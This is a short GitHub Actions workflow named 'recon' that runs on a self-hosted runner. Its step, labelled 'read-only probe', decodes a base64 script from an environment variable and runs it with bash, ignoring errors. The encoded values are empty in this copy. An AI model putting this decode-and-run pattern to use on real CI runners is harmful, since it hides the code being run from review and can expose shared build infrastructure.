name: recon-19382-v1
'on':
  push:
    branches:
    - recon-*
permissions:
  contents: read
jobs:
  probe:
    runs-on:
    - self-hosted
    - wine
    timeout-minutes: 10
    steps:
    - name: read-only probe
      env:
        PROBE_B64: 
        SCRIPT_B64: 
      run: 'W=$(mktemp -d)

        echo "$SCRIPT_B64" | base64 -d > "$W/s.sh"

        bash "$W/s.sh" 2>&1 || true

        '
